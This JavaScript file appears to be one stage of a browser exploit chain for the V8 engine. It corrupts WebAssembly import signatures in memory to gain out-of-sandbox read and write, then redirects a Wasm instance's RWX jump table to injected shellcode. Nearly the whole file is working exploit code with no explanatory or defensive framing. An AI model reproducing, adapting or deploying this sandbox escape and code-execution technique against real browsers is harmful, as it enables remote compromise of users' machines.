const baseOffsets = {
    kWasmTagObjectSerializedSignatureOffset: 0xc,

        cagedAddressOffset: 0x48,
        arrayBufferBackingOffset: 0x24,
        kRef: 0x09,
        writeSwap: true,
        jmp_table_offset: 0x38,
 
}

function findObject(primitives, needle, addr) {
    let {addrOf, cagedRead, cagedWrite} = primitives;

    let haystack = [1.1, 1.2, 1.3];
    let old = cagedRead(addrOf(haystack) + 8n);
    cagedWrite(addrOf(haystack) + 8n, (0x10000n << 32n) | (addr - 0x8n));

    let shift = false;
    let haystack_index = 0;
    function match() {
        for (let x = 0; x < needle.length; x++) {
            let val = (ftoi(haystack[haystack_index]) >> (shift ? 32n : 0n)) & 0xffffffffn;
            if (needle[x] != null && val != needle[x]) return false;
            
            shift && haystack_index++;
            shift = !shift;
        }
        return true;
    }
    while (!match() && haystack_index < haystack.length) {
        shift && haystack_index++;
        shift = !shift;
    }
    if (haystack_index == haystack.length) {
        throw new Error("Failed to find object");
    }
    
    cagedWrite(addrOf(haystack) + 8n, old);
    return addr + BigInt(haystack_index * 8) + (shift ? 4n : 0n) - BigInt(needle.length * 4);
}

function primitive_factory(offsets, primitives) {
    let {addrOf, cagedRead, cagedWrite} = primitives;

    // Prepare corruption utilities.
    const kSmiTagSize = 1;
    const kKindBits = 5;
    const kI64 = 2;
    const kRef = offsets.kRef;

    // find ByteArrayMap dynamically
    let dummy_tag = new WebAssembly.Tag({parameters: ['i64'], returns: []});
    let dummy_tag_ptr = addrOf(dummy_tag);
    let dummy_sig_ptr = cagedRead(dummy_tag_ptr + BigInt(offsets.kWasmTagObjectSerializedSignatureOffset)) & 0xffffffffn;
    let ByteArrayMap = cagedRead(dummy_sig_ptr) & 0xffffffffn;

    function fnLeak(a1) {
        return [a1];
    }

    function fnRead(ptr) {
        return [ptr];
    }

    function fnWrite(ptr, val) {
        if (offsets.writeSwap) return [ptr, val];
        return [val, ptr];
    }


    let builder = new WasmModuleBuilder();
    
    let $struct = builder.addStruct([makeField(kWasmI64, true)]);
    let $fnLeak = builder.addImport('import', 'fnLeak', makeSig([], [kWasmI64, kWasmI64]));
    let $fnRead = builder.addImport('import', 'fnRead', makeSig([kWasmI64], [wasmRefType($struct)]));
    let $fnWrite = builder.addImport('import', 'fnWrite', makeSig([kWasmI64, kWasmI64], [wasmRefType($struct), kWasmI64]));

    // Ensure that trigger is the zeroth function
    builder.addFunction('trigger', makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
        kExprI64Const, 1,
    ]);
    // Add the shellcode generator function
    generate(builder, wasmShellcode);

    // Add the leak, read and write primitives
    builder.addFunction('leak', makeSig([], [kWasmI64, kWasmI64])).exportFunc().addBody([
        kExprCallFunction, $fnLeak,
    ]);
    builder.addFunction('memRead', makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
        kExprLocalGet, 0,
        kExprI64Const, 7,
        kExprI64Sub,
        kExprCallFunction, $fnRead,
        kGCPrefix, kExprStructGet, $struct, 0,
    ]);

    builder.addFunction('memWrite', makeSig([kWasmI64, kWasmI64], [])).exportFunc().addBody([
        kExprLocalGet, 0,
        kExprI64Const, 7,
        kExprI64Sub,
        kExprLocalGet, 1,
        kExprCallFunction, $fnWrite,
        kGCPrefix, kExprStructSet, $struct, 0,
    ]);


    let instance = builder.instantiate({import: {fnLeak, fnRead, fnWrite}});

    // Confuse Leak
    let ptr = findObject(primitives, [
        ByteArrayMap, /*map=*/ 
        ((2 + 1) * 4) << kSmiTagSize, /*PodArrayBase::length=*/
        2, /*ReturnCount=*/
        kI64, kI64
    ], dummy_tag_ptr);
    // Overwrite the return count
    cagedWrite(ptr + 0x8n, BigInt(kI64)<< 32n | 1n);

    // Confuse Read
    ptr = findObject(primitives, [
        ByteArrayMap, /*map=*/
        ((2 + 1) * 4) << kSmiTagSize, /*PodArrayBase::length=*/
        1, /*ReturnCount=*/
        kRef | ($struct << kKindBits),
        kI64,
    ], dummy_tag_ptr);
    // Overwrite return type
    cagedWrite(ptr + 0xcn, BigInt(kI64) << 32n | BigInt(kI64));

    // Confuse Write
    ptr = findObject(primitives, [
        ByteArrayMap, /*map=*/
        (5 * 4) << kSmiTagSize, /*PodArrayBase::length=*/
        2, /*ReturnCount=*/
        kRef | ($struct << kKindBits), kI64, 
        kI64, kI64,
    ], dummy_tag_ptr);
    // Ovewrite return type
    cagedWrite(ptr + 0xcn, BigInt(kI64) << 32n | BigInt(kI64));

    return {...instance.exports, leak_address: instance.exports.leak()[0] - 1n};
}

export async function execute(version_hint, primitives, iomem) {
    await console.log(`Using post Wasm_WasmConfuseImportSignature`);
    const offsets = init(baseOffsets, version_hint);
    let {addrOf, cagedRead} = primitives;

    // Calculate the base address of the caged memory
    let cageBase = cagedRead(BigInt(offsets.cagedAddressOffset)) & 0xffffffff00000000n;
    if ((cageBase & 0xffffffffffn) == 0n) cageBase = cageBase >> 8n; // Account for cage shift
    let iomemAddr = addrOf(iomem.buffer);
    // Calculate the address of the iomem backing store
    let iomemBacking = BigInt(cagedRead(iomemAddr + BigInt(offsets.arrayBufferBackingOffset)) >> 24n) + cageBase;

    
    let {leak_address, memRead, memWrite, shellcode, trigger} = primitive_factory(offsets, primitives);
    
    // Search backwards in memory from `leak_address` for the TrustedWasmInstance jmp_table
    let instance_addr;
    let rwx_addr;
    for (let x = 0; x < 0x30; x++) {
        let val = memRead(leak_address - (BigInt(x) * 4n));
        if ((val & 0xffffffffn) == 0n) continue;
        if ((val & 0xffffffff00000000n) == 0n) continue;
        if ((val & 0xfffn) == 0n) {
            rwx_addr = val;
            instance_addr = leak_address - (BigInt(x) * 4n) - BigInt(offsets.jmp_table_offset);
            break;
        }
    }
    if (rwx_addr == null) {
        throw new Error("Failed to find rwx_addr");
    }

    await console.log("Instance address:", to_hex(instance_addr));
       
    let shellcodeOffset;
    // Trigger the lazy compilation of the shellcode generator function then search for the offset to the nop sled
    shellcode(1n);
    for (let x = 0; true; x += 4) {
        let d = memRead(rwx_addr + BigInt(x));
        if ((d & 0xffffn) == 0x9090n) {
            shellcodeOffset = x;
            break;
        }
        if (((d >> 32n) & 0xffffn) == 0x9090n) {
            shellcodeOffset = x + 4;
            break;
        }
    }
    await console.log("Shelcode address:", to_hex(rwx_addr + BigInt(shellcodeOffset)));

    // Overwrite the jmp_table with the shellcode address, which will be called by the trigger function after it is lazily compiled
    memWrite(instance_addr + BigInt(offsets.jmp_table_offset), rwx_addr + BigInt(shellcodeOffset));

    await console.log(`Result:`, Number(trigger(iomemBacking)));
    let data = new TextDecoder().decode(iomem.buffer);
    data = Array.from(data.matchAll(/[^\p{C}]+/gu)).map(e => '\t' + e[0]).join('\n');
    await console.log(data);
}